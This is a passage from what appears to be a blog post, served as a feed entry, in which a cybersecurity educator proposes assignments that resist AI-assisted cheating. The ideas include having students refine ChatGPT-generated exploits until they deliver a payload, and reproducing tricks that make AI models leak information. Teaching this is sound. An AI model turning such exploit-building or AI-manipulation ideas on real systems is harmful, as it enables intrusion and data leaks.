  &lt;li&gt;&lt;strong&gt;Exploit Development with AI&lt;/strong&gt;. Ask students to use ChatGPT to create an exploit for a problem. (The “problem” could be based on something as simple as a CWE or something more complex like an entire CVE.) Have them test their solution and document their findings: did the exploit work, why did it fail, and so forth. Allow them to identify the key components in the generated solution that may have had more merit than others. Finally, have them revise the generated solution so that it can, in fact, deliver a payload or exploit a vulnerability/weakness as intended. This can overlap with a variety of cases, including network security, application security, and binary exploitation.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;AI Threat Detection&lt;/strong&gt;. Have students research current trends in AI Threat Detection. Use ChatGPT to try and replicate the results; document every failure or shortcoming with using that approach. Then, have them propose a LLM (or an existing LLM) that can overcome the problems. The student should use current research to support their decisions. This task could also address the problem of “deepfake” accounts on platforms suchas LinkedIn.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;AI/LLM exploitation&lt;/strong&gt;. Use well-known anecodotes about people who could “trick A.I.” into leaking information. Have a student try to repdouce those results: why do they think it failed or succeeded, etc. Further, have the student propose ideas for AI exploitation. Content can be supported with current research, which is growing by the day.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Interview your students&lt;/strong&gt;. For group projects, take a week where the students present their idea to your and your TA’s directly. Ask them strategic, deliberate questions about their ideas or design choices. This should very much resemble a real-life job interview, where the interviewer may ask the candidate to prove that they really have mastery over a topic. Job interviews are usually where students who cheated their way through university get identified and filtered out—often, very quickly.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The big takeaway for all these solutions is that they require students to prove that they understand how the LLM is working. In addition, many of these will lead to unique starting points for the assignment. However, unlike a simple code solution, the student is required to provide a novel soltuion.&lt;/p&gt;

&lt;p&gt;Any of these topics could be at least attempted with AI. But those results are generally of an unaccepable quality. Of course, if you find that something like ChatGPT is able to defeat your questions, then it’s time to take your assignment back to the drawing board. In fact, that should be the baseline for whether you created an appropriately challenging question in the first place.&lt;/p&gt;

&lt;p&gt;However, these LLMs are still just machines that are defined by rules, which can always be defeated given enough effort (or, in many cases, with a bare-minimum effort). Deliverables like architecture diagrams or in-depth questioning may prove less feasible to generate. Conversely, they may also stand a higher chance of being detected by a traditional plagiarism detector.&lt;/p&gt;

&lt;p&gt;Industry leaders are often okay with A.I. tools used, so long as they are used &lt;em&gt;strategically&lt;/em&gt;. The strategic use of these platforms entails an understanding of &lt;em&gt;when&lt;/em&gt; and &lt;em&gt;why&lt;/em&gt; to use it. This will put your students at a much better vantage point when they are applying for a wide range of jobs.&lt;/p&gt;

&lt;h1 id=&quot;mindset-shifting&quot;&gt;Mindset-shifting&lt;/h1&gt;

&lt;p&gt;If you’re fixed on all of this as a punitive measure, then you might be missing the point. The goal here is to provide your students with a meaningful experience and a rich education. College is an investment, of time and money, and students deserve to get the most out of their investments. Holding your students to high standards is only meaningful if you also provide high support for them to reach those standards and to foster their goals.&lt;/p&gt;

&lt;p&gt;In my view, the best antidote to the AI problem is a question of mindset: did you, as the educator, challenge yourself to generate challenges that cannot be answered by widely-available freeware? And further, did you do due dilligence to hold your students accountable for their own success?&lt;/p&gt;

&lt;p&gt;This is where you, as the instructional lead, will need to also hold yourself to the same higher standard which you expect from your students. This may require you ditching the same assignments you’ve given for the past ten years. It may also require you to lean on your instructional aides in a collaborative manner, becoming more of a manager and enabling your team to provide modern, high-fidelity assignments.&lt;/p&gt;

&lt;p&gt;You can take this a step further by mirroring the same leadership and collaborative structues in the classroom. Have students circulate the “leader” for a given task or initiative. This will give students an opportunity to take ownership of the quality of their work and to call-out any A.I. work that is carelessly used. Many of your students will develop into lead engineers or managers, where they will be accountable for their subordinates’ success; and you can bet that the strategic use of A.I. platforms will be something they will need to speak to eventually.&lt;/p&gt;

&lt;p&gt;Academic institutions should accept that A.I. is here for the foreseeable future; now, more than ever, professors and teaching assistants need true support (not lip-service or empty regulations and policy changes). The best support is likely to be financial, investing in tools that can better detect LLM and AI generated code or text. Institutions can also provide support by recognizing professors who are taking strides in the direction of appropriate changes.&lt;/p&gt;

&lt;h1 id=&quot;final-thoughts&quot;&gt;Final thoughts&lt;/h1&gt;

&lt;p&gt;During my undergraduate experience, the best professors in my program were ones who understood that students may cheat. There is a difference between getting and earning a degree. So, this whole conversation is not some new phenomenon to academia; rather, A.I. is just a new version of it, and one that I don’t find particularly remarkable at all.&lt;/p&gt;

&lt;p&gt;Likewise, those same professors were usually the ones who offered challenging assignments and high levels of support, whether it be career advice, networking opportunities, or considerations for my personal or professional goals. They tried to adopt new developments in computer science, information technology, or any of the disciplines which are often groped together as “Cybersecurity.” At the end of the day, these are the things that foster success.&lt;/p&gt;

&lt;p&gt;Many undergraduates are fresh out of high school and still learning what it means to be a professional. If you are concerned about A.I. generated content overwhelming your curriculum, try to switch your point of view.&lt;/p&gt;

&lt;p&gt;You, as the leader, have an opportunity to mentor a semester’s worth of upcoming professionals. And not just the ones who lead clubs and pay lip-service, or those who think they’ve manipulated the system because they asked an LLM to do their homework; but, really, also the ones who want to do the right thing, the ones who want to be prepared for the ever-changing workforce which they are about to inherit. The ones who work 40 hours around school so they can get their education and also eat every night.&lt;/p&gt;

&lt;p&gt;Or the ones who generate A.I. content because they feel no one cares enough to check in the first place.&lt;/p&gt;</content><author><name></name></author><summary type="html">A.I. presents a new spin to the classic problem of cheating in higher-level education. To counter these challenges, I offer some ideas on how to develop assignments with the caveats presented by these content-generating platforms. As a whole, this should all promote a shift in the fidelity of assignments as well as the role of the instructional leadership teams for any course.</summary></entry></feed>